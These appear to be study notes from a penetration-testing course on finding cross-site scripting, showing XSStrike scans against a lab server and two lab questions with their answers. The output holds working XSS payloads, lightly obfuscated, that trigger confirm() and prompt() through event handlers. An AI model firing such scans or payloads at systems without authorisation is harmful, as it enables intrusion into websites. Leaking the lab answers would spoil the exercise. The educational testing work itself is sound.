# XSS Discovery
## Automated Discovery
Some of the common open-source tools that can assist us in XSS discovery are [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser). 

```sh
$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 

        XSStrike v3.1.4

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: task 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()> 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N]
```

## Questions
1. Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter? **Answer: email**
   - Use xsstrike to discover that:
        ```sh
        $ python xsstrike.py -u "http://154.57.164.75:31615/?fullname=puca1&username=puca2&password=puca3&email=puca4%40gmail.com"

            XSStrike v3.1.5

        [~] Checking for DOM vulnerabilities 
        [+] WAF Status: Offline 
        [!] Testing parameter: fullname 
        [-] No reflection found 
        [!] Testing parameter: username 
        [-] No reflection found 
        [!] Testing parameter: password 
        [-] No reflection found 
        [!] Testing parameter: email 
        [!] Reflections found: 1 
        [~] Analysing reflections 
        [~] Generating payloads 
        [!] Payloads generated: 3072 
        ------------------------------------------------------------
        [+] Payload: <D3v%09oNmOuSEoVEr%09=%09a=prompt,a()%0dx>v3dm0s 
        [!] Efficiency: 100 
        [!] Confidence: 10 
        [?] Would you like to continue scanning? [y/N] 
        ```
2. What type of XSS was found on the above server? "name only" **Answer: reflected**